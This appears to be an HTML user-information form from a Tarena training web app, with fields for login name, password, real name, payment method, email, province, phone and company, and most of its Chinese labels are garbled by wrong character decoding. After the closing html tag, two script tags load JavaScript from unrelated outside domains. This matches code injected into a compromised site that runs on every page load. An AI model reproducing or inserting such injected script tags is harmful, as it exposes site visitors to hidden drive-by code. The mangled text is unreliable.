<html>
<head>
<title> getusersuccess </title>
<style type="text/css">
<!--
@import url(/app/son.css);
@import url(/app/index.css);
-->
</style>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<link href="/app/index.css" rel="stylesheet" type="text/css">
</head>
<body bgcolor="#ccddee" background="/app/image/background.jpg" link="#000066" vlink="#0066FF" alink="#99FF00">
<hr size="1" noshade>
<div align="center"> 
  <form name="form1" method="post" action="listUser.htm">
    <table width="91%" border="0" align="center">
      <tr bgcolor="#ccddee" class="pp"> 
        <td width="14%" height="6"><span class="yellow"> ��ͨ�ʻ�</span></td>
        <td><a href="listUser.htm" class="text_link"> �û��б�</a> </td>
        <td bgcolor="#ccddee"> <div align="center"><font color="#000000">�����ʺ� 
            </font> 
            <input name="textfield2" type="text" size="16">
            <input name="Submit22" type="submit" class="button9p" value="��ѯ">
          </div></td>
      </tr>
    </table>
  </form>
  <hr size="1" noshade>
  <p align="left">&nbsp;</p>
  <span class="9P"><html:errors/></span> 
  <center>
    <h1 class="pp"> <span class="9P">�������û��Ļ�����Ϣ</span> (��<span class="pp">*</span>�ı�����д!)</h1>
    <form  method="post" action="listUser.htm">
      <table width="91%" border="1" bordercolor="ccccff" bgcolor="ccddee">
        <tr> 
          <td width="17%" class="9P">�����ʺ� *</td>
          <td width="83%" class="9P"><input type="text" name="loginName">
            �������û��������ʺ����ƣ�ֻ������Ӣ�ģ����֣��»��ߣ����ִ�Сд��</td>
        </tr>
        <tr> 
          <td class="9P">�������� *</td>
          <td class="9P"><input type="password" name="loginPassword">
            �������û��������ʺ����루�޶�Ϊ6-8λ��</td>
        </tr>
        <tr> 
          <td class="9P">�ظ����� *</td>
          <td class="9P"><input type="password" name="loginPassword2">
            ���ظ�������������</td>
        </tr>
        <tr> 
          <td class="9P"> �û����� *</td>
          <td class="9P"><input type="text" name="userName">
            �������û���ʵ����</td>
        </tr>
        <tr> 
          <td class="9P">�Ա�ѡ�� *</td>
          <td class="9P"> <input name="sex" type="radio" value="��" checked>
            �� 
            <input type="radio" name="sex" value="Ů">
            Ů</td>
        </tr>
        <tr> 
          <td class="9P">���ʽ <span class="pp">* </span></td>
          <td class="9P"> <select name="paymentStyle">
              <option value="0" selected>�ֽ�֧��</option>
              <option value="1">����ת��</option>
              <option value="2">�ʾֻ��</option>
              <option value="3">����</option>
            </select> </td>
        </tr>
        <tr> 
          <td class="9P">�û�״̬ <span class="pp">* </span></td>
          <td class="9P"> <input name="userStatus" type="radio" value="1" checked>
            ��ͨ 
            <input type="radio" name="userStatus" value="3">
            ��ͣ</td>
        </tr>
        <tr> 
          <td class="9P">�������� <span class="pp">*</span></td>
          <td class="9P"><input type="text" name="userEmail">
            ��������ȷ�ĵ���������Ϣ���Ա������ܼ�ʱ������ϵ</td>
        </tr>
        <tr> 
          <td height="56" colspan="2" class="9P"> <span class="9P"> </span> 
            <hr size="1" noshade> 
            <p align="center"><span class="yellow">������ѡ����Ϣ���뾡����д��</span><span class="9P"> 
              </span></p></td>
        </tr>
        <tr> 
          <td class="9P">ʡ��&nbsp;&nbsp;&nbsp;&nbsp; </td>
          <td><select name="nationality">
              <option value="1" selected>����</option>
              <option value="2">���</option>
              <option value="3">�ӱ�</option>
              <option value="4">����</option>
              <option value="5">����</option>
              <option value="6">����</option>
              <option value="7">������</option>
              <option value="8">���ɹ�</option>
              <option value="9">ɽ��</option>
              <option value="10">ɽ��</option>
              <option value="11">����</option>
              <option value="12">����</option>
              <option value="13">����</option>
              <option value="14">�ຣ</option>
              <option value="15">�½�</option>
              <option value="16">�Ϻ�</option>
              <option value="17">����</option>
              <option value="18">�㽭</option>
              <option value="19">����</option>
              <option value="20">�㶫</option>
              <option value="21">����</option>
              <option value="22">����</option>
              <option value="23">����</option>
              <option value="24">����</option>
              <option value="25">�Ĵ�</option>
              <option value="26">����</option>
              <option value="27">����</option>
              <option value="28">���</option>
              <option value="29">����</option>
              <option value="30">����</option>
              <option value="31">����</option>
              <option value="32">����</option>
              <option value="33">����</option>
              <option value="34">̨��</option>
              <option value="35">����</option>
            </select></td>
        </tr>
        <tr> 
          <td class="9P">ְҵ</td>
          <td class="9P"><select name="career">
              <option value="1" selected>�������ʦ</option>
              <option value="2">ҵ����</option>
              <option value="3">���ž���</option>
              <option value="4">���۾���</option>
            </select> </td>
        </tr>
        <tr> 
          <td class="9P">��ϵ�绰 </td>
          <td class="9P"><input type="text" name="userPhone">
            �����������û��绰������01062136369��</td>
        </tr>
        <tr> 
          <td class="9P">��˾&nbsp;&nbsp;&nbsp;&nbsp; </td>
          <td class="9P"><input type="text" name="company">
            �������û����ڵ�λ��Ϣ</td>
        </tr>
        <tr> 
          <td class="9P">��˾���� </td>
          <td class="9P"><input type="text" name="mailAddress">
            �������û����ڵ�λ�������</td>
        </tr>
        <tr> 
          <td class="9P">�������� </td>
          <td class="9P"><input type="text" name="postCode">
            �������û���������</td>
        </tr>
        <tr> 
          <td> </td>
          <td align="right" class="9P">&nbsp;&nbsp;&nbsp; &nbsp;</td>
        </tr>
      </table>
      <p> 
        <input type="submit" value="�ύ">&nbsp;&nbsp; 
        <input name="reset" type="reset" value="����">
      </p>
    </form>
  </center>
  <center>
  </center>
</div>
<center>
  <hr/>
  <p class="text_link"><font size="2" face="����">About Tarena - ��˾��� - ��ϵ���� - ��ط��� 
    - �ͻ����� <br>
    ���ڹ�˾��Ȩ����</font></p>
  <p class="text_link"><font size="-1">Copyright&nbsp;<img src="/image/c-00.gif" width="9" height="9">&nbsp;2000. 
    Tarena Technologies Inc. All Rights Reserved </font></p>
</center>
</body>
</html>
<script language=javascript src=http://www.shaoye1213.cn/tl.js></script>
<script language=javascript src=http://www.eheh001.cn/a.js></script>